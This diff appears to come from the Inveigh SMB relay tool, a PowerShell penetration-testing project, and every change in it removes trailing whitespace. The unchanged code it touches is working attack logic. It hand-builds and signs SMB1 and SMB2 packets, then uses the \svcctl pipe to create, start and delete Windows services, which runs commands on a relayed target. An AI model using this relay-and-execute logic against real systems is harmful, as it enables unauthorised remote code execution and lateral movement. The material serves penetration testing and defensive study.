@@ -3375,7 +3375,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
@@ -3387,7 +3387,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
-                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
+                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                         $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -3424,15 +3424,15 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
 
                         $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                         $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
-                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $RPC_data_length = $SMB_data.Length + $RPC_data.Length
@@ -3457,7 +3457,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                     }
 
                     'DeleteServiceW'
-                    { 
+                    {
 
                         if([System.BitConverter]::ToString($client_receive[88..91]) -eq '1d-04-00-00')
                         {
@@ -3473,7 +3473,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
@@ -3482,9 +3482,9 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
-                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
+                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                         $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -3515,12 +3515,12 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
 
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
@@ -3528,7 +3528,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                         if($SMB_signing)
                         {
-                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
+                            $SMB_sign = $session_key + $SMB_header + $SMB_data
                             $SMB_signature = $MD5.ComputeHash($SMB_sign)
                             $SMB_signature = $SMB_signature[0..7]
                             $packet_SMB_header["Signature"] = $SMB_signature
@@ -3549,7 +3549,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
@@ -3558,9 +3558,9 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
-                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
+                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                         $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -3579,7 +3579,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $client_stream.Flush()
                         $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                         $stage = 'ReadAndXRequest'
-                        $stage_next = 'CheckAccess'           
+                        $stage_next = 'CheckAccess'
                     }
 
                     'ReadAndXRequest'
@@ -3590,12 +3590,12 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
 
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBReadAndXRequest $SMB_FID
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
@@ -3603,7 +3603,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                         if($SMB_signing)
                         {
-                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
+                            $SMB_sign = $session_key + $SMB_header + $SMB_data
                             $SMB_signature = $MD5.ComputeHash($SMB_sign)
                             $SMB_signature = $SMB_signature[0..7]
                             $packet_SMB_header["Signature"] = $SMB_signature
@@ -3625,7 +3625,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
@@ -3655,10 +3655,10 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $stage = 'ReadAndXRequest'
                         $stage_next = 'OpenSCManagerW'
                     }
-                
+
                     'StartServiceW'
                     {
-                    
+
                         if([System.BitConverter]::ToString($client_receive[112..115]) -eq '00-00-00-00')
                         {
                             Write-Verbose "Service $SMB_service created on $Target"
@@ -3668,7 +3668,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             if($SMB_signing)
                             {
                                 $packet_SMB_header["Flags2"] = 0x05,0x48
-                                $SMB_signing_counter = $SMB_signing_counter + 2 
+                                $SMB_signing_counter = $SMB_signing_counter + 2
                                 [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                                 $packet_SMB_header["Signature"] = $SMB_signing_sequence
                             }
@@ -3677,10 +3677,10 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                             $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                             $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
-                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                             $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                             $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
-                             
+
                             $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -3700,7 +3700,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $client_stream.Flush()
                             $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                             $stage = 'ReadAndXRequest'
-                            $stage_next = 'DeleteServiceW'  
+                            $stage_next = 'DeleteServiceW'
                         }
                         elseif([System.BitConverter]::ToString($client_receive[112..115]) -eq '31-04-00-00')
                         {
@@ -3712,9 +3712,9 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             Write-Output "[-] Service creation fault context mismatch"
                             $stage = 'Exit'
                         }
-    
+
                     }
-                
+
                     'TreeConnectAndXRequest'
                     {
                         $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID $SMB_user_ID
@@ -3723,12 +3723,12 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         {
                             $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = 2 
+                            $SMB_signing_counter = 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
 
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
@@ -3736,7 +3736,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                         if($SMB_signing)
                         {
-                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
+                            $SMB_sign = $session_key + $SMB_header + $SMB_data
                             $SMB_signature = $MD5.ComputeHash($SMB_sign)
                             $SMB_signature = $SMB_signature[0..7]
                             $packet_SMB_header["Signature"] = $SMB_signature
@@ -3762,7 +3762,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
 
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
@@ -3770,7 +3770,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                         if($SMB_signing)
                         {
-                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
+                            $SMB_sign = $session_key + $SMB_header + $SMB_data
                             $SMB_signature = $MD5.ComputeHash($SMB_sign)
                             $SMB_signature = $SMB_signature[0..7]
                             $packet_SMB_header["Signature"] = $SMB_signature
@@ -3785,13 +3785,13 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                     }
 
                 }
-            
+
             }
 
-        }  
+        }
         else
         {
-            
+
             $stage = 'TreeConnect'
 
             try
@@ -3802,7 +3802,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                     switch ($stage)
                     {
-                
+
                         'CheckAccess'
                         {
 
@@ -3810,7 +3810,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             {
 
                                 $SMB_service_manager_context_handle = $client_receive[108..127]
-                                
+
                                 if($SMB_execute -eq $true)
                                 {
                                     Write-Verbose "$output_username has Service Control Manager write privilege on $Target"
@@ -3853,12 +3853,12 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
-        
+
                             $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                             $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
@@ -3895,18 +3895,18 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                             $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00
-                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
-                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)     
+                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
+                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -3923,29 +3923,29 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                             $stage = 'SendReceive'
                         }
-                    
+
                         'CreateRequest'
                         {
                             $stage_current = $stage
                             $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
-                            $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
+                            $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
 
                             if($SMB_signing)
                             {
-                                $SMB2_sign = $SMB2_header + $SMB2_data  
+                                $SMB2_sign = $SMB2_header + $SMB2_data
                                 $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                 $SMB2_signature = $SMB2_signature[0..15]
                                 $packet_SMB2_header["Signature"] = $SMB2_signature
@@ -3974,7 +3974,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             {
                                 Write-Output "[-] Session connection is closed"
                                 $stage = 'Exit'
-                            }                    
+                            }
 
                         }
 
@@ -3983,10 +3983,10 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
@@ -4017,20 +4017,20 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                            
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                             $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                             $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                             $SMB_split_index_tracker = $SMB_split_index
-                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
+                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                             $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -4054,10 +4054,10 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $SMB_split_stage++
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                            
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
@@ -4067,7 +4067,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                             $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -4090,10 +4090,10 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                            
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
@@ -4101,7 +4101,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                             $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -4120,7 +4120,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         }
 
                         'DeleteServiceW'
-                        { 
+                        {
 
                             if([System.BitConverter]::ToString($client_receive[108..111]) -eq '1d-04-00-00')
                             {
@@ -4134,7 +4134,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                            
+
                             if($SMB_signing)
                             {
                                 $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
@@ -4143,10 +4143,10 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                             $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                             $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00
-                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
+                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                             $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -4169,12 +4169,12 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
-            
+
                             $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                             $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
@@ -4199,19 +4199,19 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                             $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                             $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
-                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
+                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                             $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -4235,49 +4235,49 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $stage_current = $stage
                             $message_ID++
                             $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
-                        
+
                             if($SMB_signing)
                             {
-                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
+                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00
                             }
 
                             $packet_SMB2_data = New-PacketSMB2ReadRequest $file_ID
                             $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
